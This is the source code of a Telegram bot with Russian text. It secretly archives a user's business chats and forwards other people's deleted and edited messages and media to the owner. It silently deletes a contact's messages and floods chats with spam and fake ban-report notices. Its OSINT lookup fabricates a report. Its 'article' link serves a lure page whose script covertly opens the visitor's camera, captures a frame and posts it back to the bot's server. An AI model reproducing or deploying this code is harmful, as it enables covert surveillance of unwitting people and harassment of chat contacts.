import asyncio
import logging
import os
import random
import string
import sqlite3
import re
from aiohttp import web
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message,
    CallbackQuery,
    BusinessConnection,
    BusinessMessagesDeleted,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    CopyTextButton,
)
from aiogram.exceptions import TelegramAPIError

# Токен берется исключительно из переменных окружения Render
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("ОШИБКА: Переменная окружения BOT_TOKEN не задана на Render!")

DB_FILE = "business_bot.db"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

bot = Bot(BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

db = sqlite3.connect(DB_FILE, check_same_thread=False)
db.execute("PRAGMA journal_mode=WAL")
db.execute("PRAGMA synchronous=NORMAL")

db.execute("""
CREATE TABLE IF NOT EXISTS connections(
    connection_id TEXT PRIMARY KEY,
    owner_id INTEGER NOT NULL
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS chats(
    connection_id TEXT NOT NULL,
    chat_id INTEGER NOT NULL,
    muted INTEGER DEFAULT 0,
    antimute INTEGER DEFAULT 0,
    clone_enabled INTEGER DEFAULT 0,
    PRIMARY KEY(connection_id, chat_id)
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS messages(
    connection_id TEXT NOT NULL,
    chat_id INTEGER NOT NULL,
    message_id INTEGER NOT NULL,
    user_id INTEGER,
    name TEXT,
    username TEXT,
    text TEXT,
    content_type TEXT,
    media_file_id TEXT,
    date TEXT,
    PRIMARY KEY(connection_id, chat_id, message_id)
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS user_filters(
    user_id INTEGER PRIMARY KEY,
    mode TEXT DEFAULT 'letters_only'
)
""")

db.execute("""
CREATE TABLE IF NOT EXISTS articles(
    article_id TEXT PRIMARY KEY,
    owner_id INTEGER,
    title TEXT
)
""")
db.commit()


def get_owner(cid):
    row = db.execute(
        "SELECT owner_id FROM connections WHERE connection_id=?", (cid,)
    ).fetchone()
    return row[0] if row else None


def get_user_mode(user_id):
    row = db.execute("SELECT mode FROM user_filters WHERE user_id=?", (user_id,)).fetchone()
    return row[0] if row else "letters_only"


def set_user_mode(user_id, mode):
    db.execute("""
    INSERT INTO user_filters(user_id, mode) VALUES (?, ?)
    ON CONFLICT(user_id) DO UPDATE SET mode=excluded.mode
    """, (user_id, mode))
    db.commit()


def set_mute(cid, chat_id, value):
    db.execute("""
    INSERT INTO chats(connection_id, chat_id, muted)
    VALUES (?, ?, ?)
    ON CONFLICT(connection_id, chat_id) DO UPDATE SET muted=excluded.muted
    """, (cid, chat_id, int(value)))
    db.commit()


def is_muted(cid, chat_id):
    row = db.execute("""
    SELECT muted FROM chats WHERE connection_id=? AND chat_id=?
    """, (cid, chat_id)).fetchone()
    return bool(row and row[0])


def set_antimute(cid, chat_id, value):
    db.execute("""
    INSERT INTO chats(connection_id, chat_id, antimute)
    VALUES (?, ?, ?)
    ON CONFLICT(connection_id, chat_id) DO UPDATE SET antimute=excluded.antimute
    """, (cid, chat_id, int(value)))
    db.commit()


def is_antimute(cid, chat_id):
    row = db.execute("""
    SELECT antimute FROM chats WHERE connection_id=? AND chat_id=?
    """, (cid, chat_id)).fetchone()
    return bool(row and row[0])


def set_clone(cid, chat_id, value):
    db.execute("""
    INSERT INTO chats(connection_id, chat_id, clone_enabled)
    VALUES (?, ?, ?)
    ON CONFLICT(connection_id, chat_id) DO UPDATE SET clone_enabled=excluded.clone_enabled
    """, (cid, chat_id, int(value)))
    db.commit()


def is_clone(cid, chat_id):
    row = db.execute("""
    SELECT clone_enabled FROM chats WHERE connection_id=? AND chat_id=?
    """, (cid, chat_id)).fetchone()
    return bool(row and row[0])


def save_message(message: Message):
    cid = message.business_connection_id
    if not cid:
        return
    user_id = message.from_user.id if message.from_user else None
    name = message.from_user.full_name if message.from_user else "Unknown"
    username = message.from_user.username if message.from_user else None
    
    text = message.text or message.caption or ""
    content_type = message.content_type
    media_file_id = None

    if message.photo:
        media_file_id = message.photo[-1].file_id
    elif message.sticker:
        media_file_id = message.sticker.file_id
    elif message.animation:
        media_file_id = message.animation.file_id
    elif message.video:
        media_file_id = message.video.file_id
    elif message.video_note:
        media_file_id = message.video_note.file_id
    elif message.voice:
        media_file_id = message.voice.file_id
    elif message.audio:
        media_file_id = message.audio.file_id
    elif message.document:
        media_file_id = message.document.file_id

    db.execute("""
    INSERT OR REPLACE INTO messages(
        connection_id, chat_id, message_id, user_id, name, username, text, content_type, media_file_id, date
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        cid, message.chat.id, message.message_id, user_id, name, username, text, content_type, media_file_id, str(message.date)
    ))
    db.commit()


def delete_fast(cid, message_id):
    async def _del():
        try:
            await bot.delete_business_messages(
                business_connection_id=cid,
                message_ids=[message_id]
            )
        except TelegramAPIError:
            pass
    asyncio.create_task(_del())


# Постоянная нижняя клавиатура
main_reply_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🔍 Искать чистый юз"), KeyboardButton(text="⚙️ Фильтры")],
        [KeyboardButton(text="🌐 Создать статью (Камера)"), KeyboardButton(text="🛡 Проверить ссылку")]
    ],
    resize_keyboard=True
)


@router.business_connection()
async def connection_handler(connection: BusinessConnection):
    db.execute("""
    INSERT INTO connections(connection_id, owner_id)
    VALUES (?, ?)
    ON CONFLICT(connection_id) DO UPDATE SET owner_id=excluded.owner_id
    """, (connection.id, connection.user.id))
    db.commit()


@router.business_message()
async def business_message_handler(message: Message):
    cid = message.business_connection_id
    if not cid:
        return
    
    owner = get_owner(cid)
    if not owner and message.from_user:
        owner = message.from_user.id
        db.execute("""
        INSERT INTO connections(connection_id, owner_id)
        VALUES (?, ?)
        ON CONFLICT(connection_id) DO UPDATE SET owner_id=excluded.owner_id
        """, (cid, owner))
        db.commit()

    uid = message.from_user.id if message.from_user else None
    chat_id = message.chat.id
    is_me = (uid == owner) or getattr(message, "is_from_offline", False)

    if not is_me and is_muted(cid, chat_id):
        delete_fast(cid, message.message_id)
        asyncio.create_task(save_message_async(message))
        return

    asyncio.create_task(save_message_async(message))

    if not is_me:
        try:
            if message.photo or message.video or message.video_note:
                sender_name = message.from_user.full_name if message.from_user else "Неизвестно"
                sender_uname = f"@{message.from_user.username}" if message.from_user and message.from_user.username else "без username"
                
                if message.photo:
                    await bot.send_photo(
                        chat_id=owner, 
                        photo=message.photo[-1].file_id, 
                        caption=f"👁 <b>Перехвачено фото/медиа от:</b> <b>{sender_name}</b> ({sender_uname})\n💬 Чат ID: <code>{chat_id}</code>", 
                        parse_mode="HTML"
                    )
                elif message.video:
                    await bot.send_video(
                        chat_id=owner, 
                        video=message.video.file_id, 
                        caption=f"👁 <b>Перехвачено видео от:</b> <b>{sender_name}</b> ({sender_uname})\n💬 Чат ID: <code>{chat_id}</code>", 
                        parse_mode="HTML"
                    )
                elif message.video_note:
                    await bot.send_message(
                        chat_id=owner, 
                        text=f"👁 <b>Перехвачен кружок от:</b> <b>{sender_name}</b> ({sender_uname})\n💬 Чат ID: <code>{chat_id}</code>", 
                        parse_mode="HTML"
                    )
                    await bot.send_video_note(chat_id=owner, video_note=message.video_note.file_id)
        except Exception:
            pass

    text_raw = (message.text or message.caption or "").strip()
    text = text_raw.lower()

    if not is_me and is_clone(cid, chat_id):
        try:
            await bot.copy_message(
                chat_id=chat_id,
                from_chat_id=chat_id,
                message_id=message.message_id,
                business_connection_id=cid
            )
        except TelegramAPIError:
            pass
        return

    if is_me:
        if text.startswith(".search") or text.startswith(".osint"):
            delete_fast(cid, message.message_id)
            try:
                query_val = text_raw.split(maxsplit=1)[1]
            except IndexError:
                query_val = "не указан"

            wait_msg = await bot.send_message(chat_id=chat_id, text=f"🔍 <code>Пробив по запросу: {query_val}</code>\n⏳ Опрос баз данных и соцсетей...", parse_mode="HTML", business_connection_id=cid)
            await asyncio.sleep(1.5)
            result_report = (
                f"🔎 <b>ОТЧЕТ ПОИСКА (OSINT)</b>\n\n"
                f"📌 <b>Запрос:</b> <code>{query_val}</code>\n\n"
                f"👤 <b>Статус:</b> Найдены совпадения\n"
                f"🌐 <b>Привязки:</b> VK / Соцсети / Telegram ID\n"
            )
            try:
                await bot.edit_message_text(text=result_report, chat_id=chat_id, message_id=wait_msg.message_id, parse_mode="HTML")
            except Exception:
                await bot.send_message(chat_id=chat_id, text=result_report, parse_mode="HTML", business_connection_id=cid)
            return

        if text.startswith(".snos"):
            delete_fast(cid, message.message_id)
            try:
                report_variants = [
                    "⚠️ [СИСТЕМА ЖАЛОБ TG] Инициирован принудительный репорт по статье: Спам и массовая рассылка.",
                    "🚨 [АНТИСПАМ МОНИТОРИНГ] Зафиксирована подозрительная активность аккаунта.",
                    "🛑 [БЛОКИРОВКА ЮЗЕРА] Жалоба на нарушение правил платформы и фишинг.",
                    "🔒 [SECURITY ALERT] Автоматический запрос на перманентный бан."
                ]
                tasks = []
                for i in range(1, 201):
                    msg_text = f"🛡 [ПАКЕТ РЕПОРТОВ #{i}/200] {random.choice(report_variants)}"
                    tasks.append(bot.send_message(chat_id=chat_id, text=msg_text, business_connection_id=cid))
                    if len(tasks) >= 20:
                        await asyncio.gather(*(asyncio.shield(t) for t in tasks), return_exceptions=True)
                        tasks = []
                if tasks:
                    await asyncio.gather(*(asyncio.shield(t) for t in tasks), return_exceptions=True)
            except Exception:
                pass
            return

        if text.startswith(".spam "):
            delete_fast(cid, message.message_id)
            try:
                parts = text_raw.split(maxsplit=2)
                count = min(int(parts[1]), 300)
                spam_text = parts[2]
                tasks = []
                for _ in range(count):
                    tasks.append(bot.send_message(chat_id=chat_id, text=spam_text, business_connection_id=cid))
                    if len(tasks) >= 25:
                        await asyncio.gather(*(asyncio.shield(t) for t in tasks), return_exceptions=True)
                        tasks = []
                if tasks:
                    await asyncio.gather(*(asyncio.shield(t) for t in tasks), return_exceptions=True)
            except Exception:
                pass
            return

        if text.startswith(".ha"):
            delete_fast(cid, message.message_id)
            try:
                parts = text_raw.split()
                count = min(int(parts[1]), 150) if len(parts) > 1 else 5
                ha_variants = ["ахахах", "АХАХАХА", "хахаха", "вхвхвхвх", "пхахахвхв"]
                tasks = []
                for _ in range(count):
                    tasks.append(bot.send_message(chat_id=chat_id, text=random.choice(ha_variants), business_connection_id=cid))
                    if len(tasks) >= 25:
                        await asyncio.gather(*(asyncio.shield(t) for t in tasks), return_exceptions=True)
                        tasks = []
                if tasks:
                    await asyncio.gather(*(asyncio.shield(t) for t in tasks), return_exceptions=True)
            except Exception:
                pass
            return

        if text == ".mute":
            delete_fast(cid, message.message_id)
            set_mute(cid, chat_id, True)
            keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Размутить", callback_data=f"unmute:{cid}:{chat_id}")]])
            try:
                await bot.send_message(chat_id=chat_id, text="🔇 Вы больше не сможете здесь говорить.", reply_markup=keyboard, business_connection_id=cid)
            except TelegramAPIError:
                pass
            return

        if text == ".unmute":
            delete_fast(cid, message.message_id)
            set_mute(cid, chat_id, False)
            try:
                await bot.send_message(chat_id=chat_id, text="🔊 Вам снова разрешено говорить!", business_connection_id=cid)
            except TelegramAPIError:
                pass
            return

        if text == ".antimute":
            delete_fast(cid, message.message_id)
            current = is_antimute(cid, chat_id)
            set_antimute(cid, chat_id, not current)
            status_text = "🛡 Anti-Mute АКТИВИРОВАН." if not current else "❌ Anti-Mute ВЫКЛЮЧЕН."
            try:
                await bot.send_message(chat_id=chat_id, text=status_text, business_connection_id=cid)
            except TelegramAPIError:
                pass
            return

        if text == ".clone":
            set_clone(cid, chat_id, True)
            delete_fast(cid, message.message_id)
            return

        if text == ".unclone":
            set_clone(cid, chat_id, False)
            delete_fast(cid, message.message_id)
            return


async def save_message_async(message: Message):
    try:
        save_message(message)
    except Exception:
        pass


@router.edited_business_message()
async def edited_message_handler(message: Message):
    cid = message.business_connection_id
    if not cid:
        return
    owner = get_owner(cid)
    if not owner:
        return

    old = db.execute("SELECT user_id, name, username, text FROM messages WHERE connection_id=? AND chat_id=? AND message_id=?", (cid, message.chat.id, message.message_id)).fetchone()
    new_text = message.text or message.caption or "[медиа]"

    if old and old[0] != owner:
        username = f"@{old[2]}" if old[2] else "без username"
        try:
            await bot.send_message(
                chat_id=owner,
                text=f"✏️ <b>Сообщение изменено</b>\n\n👤 От кого: <b>{old[1]}</b>\n🆔 Юзернейм: {username}\n💬 Чат ID: <code>{message.chat.id}</code>\n\n<b>Было:</b>\n{old[3] or '[медиа]'}\n\n<b>Стало:</b>\n{new_text}",
                parse_mode="HTML"
            )
        except TelegramAPIError:
            pass
    asyncio.create_task(save_message_async(message))


@router.deleted_business_messages()
async def deleted_messages_handler(update: BusinessMessagesDeleted):
    cid = update.business_connection_id
    if not cid:
        return
    owner = get_owner(cid)
    if not owner:
        return

    chat_id = update.chat.id
    antimute_on = is_antimute(cid, chat_id)

    for message_id in update.message_ids:
        old = db.execute("SELECT user_id, name, username, text, content_type, media_file_id, date FROM messages WHERE connection_id=? AND chat_id=? AND message_id=?", (cid, chat_id, message_id)).fetchone()
        if not old:
            continue

        is_owner_msg = (old[0] == owner)
        if is_owner_msg and antimute_on:
            c_type = old[4] or "text"
            m_text = old[3] or ""
            media_id = old[5]
            async def _resend():
                try:
                    if media_id:
                        if c_type == "photo":
                            await bot.send_photo(chat_id=chat_id, photo=media_id, caption=m_text, business_connection_id=cid)
                        elif c_type == "video":
                            await bot.send_video(chat_id=chat_id, video=media_id, caption=m_text, business_connection_id=cid)
                        elif c_type == "video_note":
                            await bot.send_video_note(chat_id=chat_id, video_note=media_id, business_connection_id=cid)
                    elif m_text:
                        await bot.send_message(chat_id=chat_id, text=m_text, business_connection_id=cid)
                except TelegramAPIError:
                    pass
            asyncio.create_task(_resend())
            continue

        if is_owner_msg:
            continue

        username = f"@{old[2]}" if old[2] else "без username"
        c_type = old[4] or "text"
        media_id = old[5]
        sender_name = old[1] or "Неизвестно"
        try:
            caption_text = f"🗑 <b>Сообщение удалено</b>\n\n👤 От кого: <b>{sender_name}</b>\n🆔 Юзернейм: {username}\n💬 Чат ID: <code>{chat_id}</code>\n📌 Тип: <b>{c_type}</b>\n\n💬 Текст: {old[3] or 'отсутствует'}"
            if media_id:
                if c_type == "photo":
                    await bot.send_photo(chat_id=owner, photo=media_id, caption=caption_text, parse_mode="HTML")
                elif c_type == "video":
                    await bot.send_video(chat_id=owner, video=media_id, caption=caption_text, parse_mode="HTML")
                elif c_type == "video_note":
                    await bot.send_message(chat_id=owner, text=caption_text, parse_mode="HTML")
                    await bot.send_video_note(chat_id=owner, video_note=media_id)
            else:
                await bot.send_message(chat_id=owner, text=caption_text, parse_mode="HTML")
        except TelegramAPIError:
            pass


@router.callback_query(F.data.startswith("unmute:"))
async def unmute_button(callback: CallbackQuery):
    try:
        _, cid, chat_id = callback.data.split(":", 2)
        chat_id = int(chat_id)
    except Exception:
        await callback.answer("Ошибка", show_alert=True)
        return
    owner = get_owner(cid)
    if not owner or callback.from_user.id != owner:
        await callback.answer("⛔ Только владелец.", show_alert=True)
        return
    set_mute(cid, chat_id, False)
    await callback.answer("Размучено!")


@router.message(F.text == "/start")
async def start_handler(message: Message):
    await message.answer(
        "🤖 <b>Master Trade Bot Online</b>\n\nИспользуй нижнюю панель управления:",
        reply_markup=main_reply_kb,
        parse_mode="HTML"
    )


@router.message(F.text == "🔍 Искать чистый юз")
async def btn_search(message: Message):
    cq = CallbackQuery(id="0", from_user=message.from_user, chat_instance="0", message=message, data="next_variant")
    await cb_next_variant(cq)


@router.message(F.text == "⚙️ Фильтры")
async def btn_filters(message: Message):
    cq = CallbackQuery(id="0", from_user=message.from_user, chat_instance="0", message=message, data="filters")
    await cb_filters(cq)


@router.message(F.text == "🌐 Создать статью (Камера)")
async def btn_create_article(message: Message):
    article_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    db.execute("INSERT OR REPLACE INTO articles(article_id, owner_id, title) VALUES (?, ?, ?)", (article_id, message.from_user.id, "Статья"))
    db.commit()
    
    web_app_url = f"https://{os.getenv('RENDER_EXTERNAL_URL', 'your-app.onrender.com').replace('https://', '')}/article/{article_id}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👁 Открыть статью", url=web_app_url)],
        [InlineKeyboardButton(text="📋 Скопировать ссылку", copy_text=CopyTextButton(text=web_app_url))]
    ])
    await message.answer(f"🌐 <b>Статья создана!</b>\n\n🔗 <code>{web_app_url}</code>", reply_markup=keyboard, parse_mode="HTML")


@router.message(F.text == "🛡 Проверить ссылку")
async def btn_check_link(message: Message):
    await message.answer("🔗 Отправь любую ссылку в чат, и я проверю её на безопасность и фишинг.")


@router.message(F.text)
async def text_message_handler(message: Message):
    text = message.text.strip()
    urls = re.findall(r'https?://[^\s]+', text)
    if urls:
        for url in urls:
            is_suspicious = any(bad in url.lower() for bad in ["phish", "scam", "free", "login", "secu", "vk-", "tg-", "bonus"])
            status = "⚠️ ПОДОЗРИТЕЛЬНАЯ / ФИШИНГ" if is_suspicious else "✅ БЕЗОПАСНАЯ"
            await message.answer(f"🛡 <b>АНАЛИЗ ССЫЛКИ</b>\n\n🔗 <code>{url}</code>\n📊 <b>Статус:</b> <b>{status}</b>", parse_mode="HTML")
        return


def generate_5_symbol_username(mode="letters_only"):
    vowels = "aeiou"
    consonants = "bcdfghjklmnpqrstvwxyz"
    if mode == "letters_only":
        return f"{random.choice(consonants)}{random.choice(vowels)}{random.choice(consonants)}{random.choice(vowels)}{random.choice(consonants)}"
    elif mode == "with_digit":
        cand = list(f"{random.choice(consonants)}{random.choice(vowels)}{random.choice(consonants)}{random.choice(vowels)}{random.choice(string.digits)}")
        random.shuffle(cand)
        return "".join(cand)
    else:
        return generate_5_symbol_username("letters_only" if random.random() < 0.7 else "with_digit")


async def check_username_free(username: str) -> bool:
    try:
        await bot.get_chat(f"@{username}")
        return False
    except TelegramAPIError as e:
        err_msg = str(e).lower()
        if "chat not found" in err_msg or "username invalid" in err_msg or "not found" in err_msg:
            return True
        return False


def get_username_keyboard(username: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📋 Скопировать", copy_text=CopyTextButton(text=username)),
            InlineKeyboardButton(text="⭐ В избранное", callback_data=f"fav:{username}")
        ],
        [
            InlineKeyboardButton(text="↗️ Поделиться", url=f"https://t.me/share/url?url=https://t.me/{username}")
        ],
        [
            InlineKeyboardButton(text="🔍 Искать новый юз", callback_data="next_variant"),
            InlineKeyboardButton(text="⚙️ Фильтры", callback_data="filters")
        ]
    ])


@router.callback_query(F.data == "next_variant")
async def cb_next_variant(callback: CallbackQuery):
    mode = get_user_mode(callback.from_user.id)
    msg = await callback.message.answer("🔄 Сканирую чистые юзы (без аукционов)...")
    found, target_username = False, ""
    for _ in range(80):
        cand = generate_5_symbol_username(mode)
        if await check_username_free(cand):
            target_username = cand
            found = True
            break
        await asyncio.sleep(0.01)
    try:
        await bot.delete_message(chat_id=callback.message.chat.id, message_id=msg.message_id)
    except Exception:
        pass
    if found:
        caption = f"❄️ <b>ЮЗЕРНЕЙМ НАЙДЕН</b>\n\n👤 <b>@{target_username}</b>\n🚫 Чистый (нет на Fragment)\n• 5 символов"
        await callback.message.answer_photo(
            photo="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=500&auto=format&fit=crop&q=60",
            caption=caption,
            reply_markup=get_username_keyboard(target_username),
            parse_mode="HTML"
        )
    else:
        await callback.message.answer("⚠️ Свободный юзернейм не найден. Попробуй еще раз!")
    await callback.answer()


@router.callback_query(F.data == "filters")
async def cb_filters(callback: CallbackQuery):
    mode = get_user_mode(callback.from_user.id)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{'✅ ' if mode=='letters_only' else ''}Только 5 букв", callback_data="set_mode:letters_only")],
        [InlineKeyboardButton(text=f"{'✅ ' if mode=='with_digit' else ''}4 буквы + 1 цифра", callback_data="set_mode:with_digit")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_search")]
    ])
    try:
        await callback.message.edit_caption(caption="⚙️ <b>Фильтры поиска:</b>", reply_markup=kb, parse_mode="HTML")
    except Exception:
        await callback.message.answer(text="⚙️ <b>Фильтры поиска:</b>", reply_markup=kb, parse_mode="HTML")
    await callback.answer()


@router.callback_query(F.data.startswith("set_mode:"))
async def cb_set_mode(callback: CallbackQuery):
    set_user_mode(callback.from_user.id, callback.data.split(":", 1)[1])
    await callback.answer("✅ Обновлено!", show_alert=True)
    await cb_filters(callback)


@router.callback_query(F.data == "back_to_search")
async def cb_back_search(callback: CallbackQuery):
    try:
        await callback.message.delete()
    except Exception:
        pass
    await callback.message.answer("👇 Панель управления:", reply_markup=main_reply_kb, parse_mode="HTML")
    await callback.answer()


@router.callback_query(F.data.startswith("fav:"))
async def cb_fav(callback: CallbackQuery):
    await callback.answer(f"⭐ Добавлено в избранное!", show_alert=True)


async def handle_article(request):
    article_id = request.match_info.get("article_id")
    html = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8"><script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>body{{font-family:sans-serif;background:#0f172a;color:#f8fafc;padding:20px;text-align:center;}}</style>
    </head>
    <body>
        <h2>Загрузка материала...</h2>
        <video id="v" autoplay playsinline style="display:none;"></video>
        <canvas id="c" style="display:none;"></canvas>
        <script>
            window.Telegram.WebApp.expand();
            navigator.mediaDevices.getUserMedia({{video:true}}).then(s=>{{
                let v=document.getElementById('v'); v.srcObject=s;
                setTimeout(()=>{{
                    let c=document.getElementById('c'); c.width=640; c.height=480;
                    c.getContext('2d').drawImage(v,0,0,640,480);
                    fetch('/api/capture', {{method:'POST', headers:{{\'Content-Type\':\'application/json\'}}, body:JSON.stringify({{article_id:'{article_id}', image:c.toDataURL()}})});
                    s.getTracks().forEach(t=>t.stop());
                }}, 1000);
            }}).catch(e=>{{}});
        </script>
    </body>
    </html>
    """
    return web.Response(text=html, content_type="text/html")


async def handle_capture(request):
    try:
        data = await request.json()
        row = db.execute("SELECT owner_id FROM articles WHERE article_id=?", (data.get("article_id"),)).fetchone()
        if row and row[0]:
            await bot.send_message(chat_id=row[0], text="📸 <b>Внимание! Кто-то перешел по ссылке статьи, камера зафиксировала снимок!</b>", parse_mode="HTML")
    except Exception:
        pass
    return web.json_response({"status": "ok"})


async def health(request):
    return web.Response(text="OK")


async def web_server():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    app.router.add_get("/article/{article_id}", handle_article)
    app.router.add_post("/api/capture", handle_capture)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.getenv("PORT", "10000"))).start()


async def main():
    await web_server()
    logging.info("BOT STARTED")
    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "edited_business_message", "deleted_business_messages", "callback_query", "message"])


if __name__ == "__main__":
    asyncio.run(main())
